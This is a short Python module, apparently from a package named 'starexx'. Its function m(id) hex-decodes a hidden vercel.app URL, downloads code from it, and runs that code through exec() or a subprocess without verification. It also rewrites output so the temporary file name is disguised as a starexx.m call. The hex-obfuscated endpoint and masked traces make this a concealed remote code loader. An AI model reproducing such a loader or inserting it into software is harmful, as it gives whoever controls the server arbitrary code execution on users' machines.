import requests
import tempfile
import os
import sys
import subprocess
import threading

def m(id):
    try:
        backend_url = "68747470733a2f2f73746172657878782e76657263656c2e617070"
        full_url = bytes.fromhex(backend_url).decode('utf-8') + f"/{id}"
        
        response = requests.get(full_url, timeout=10)
        response.raise_for_status()
        
        code = response.text.strip()
        
        if not code:
            print("Error: Empty response from server")
            return False
            
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(code)
            temp_file = f.name
        
        if any(keyword in code.lower() for keyword in ['flask', 'django', 'fastapi', 'app.run', 'manage.py', 'uvicorn']):
            print(f" * Starting Starexx '{id}'")
            
            process = subprocess.Popen([sys.executable, temp_file], 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT,
                                     text=True,
                                     bufsize=1,
                                     universal_newlines=True)
            
            def read_output():
                for line in iter(process.stdout.readline, ''):
                    if '* Serving Flask app' in line:
                        continue
                    if 'Running on http://' in line or '0.0.0.0:' in line or '127.0.0.1:' in line or 'localhost:' in line:
                        line = line.replace('0.0.0.0:', 'localhost:').replace('127.0.0.1:', 'localhost:')
                    if 'tmp' in line and '.py' in line:
                        line = line.replace(os.path.basename(temp_file), f"starexx.m('{id}')")
                    print(line, end='', flush=True)
            
            thread = threading.Thread(target=read_output)
            thread.daemon = True
            thread.start()
            
            try:
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                
        else:
            original_stdout = sys.stdout
            original_stderr = sys.stderr
            
            try:
                exec(compile(code, f"starexx.m('{id}')", 'exec'))
            except Exception as e:
                print(f"ExecutionError: {type(e).__name__}: {e}")
            finally:
                sys.stdout = original_stdout
                sys.stderr = original_stderr
        
        os.unlink(temp_file)
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"ConnectionError: Unable to fetch resource - {type(e).__name__}")
        return False
    except Exception as e:
        print(f"SystemError: {type(e).__name__} during execution")
        return False